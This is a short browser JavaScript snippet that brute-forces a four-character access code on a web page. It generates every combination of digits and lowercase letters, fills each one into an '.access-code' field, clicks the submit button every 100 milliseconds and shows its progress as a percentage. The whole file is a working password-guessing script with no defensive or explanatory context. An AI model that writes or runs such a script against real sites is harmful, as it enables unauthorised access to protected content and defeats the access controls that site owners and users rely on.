
const CHARS = '0123456789abcdefghijklmnopqrstuvwxyz';
const PASS_NUM = 1679616;
const DELAY = 100;

var i = 1;
const $msg = document.querySelector('.pickpw dt');

const timer = setInterval(function() {
  testPw(i);
  i++;
  if(i > PASS_NUM) clearInterval(timer);
}, DELAY);

function progress(num=0) {
  $msg.innerHTML = [num, '/', PASS_NUM, '('+Math.floor(num/PASS_NUM*10000)/100+'%)'].join('');
}

function testPw(p) {
  progress(p);
  document.querySelector('.access-code').value = toPw(p);
  document.querySelector('#submitBtn a').click();
}

function toPw(num=0) {
  var n = num;
  var pw = '';
  for(var i = 0; i < 4; i++) {
    pw = CHARS.charAt(Math.floor(n % CHARS.length))+pw;
    n /= CHARS.length;
  }

  return pw;
}

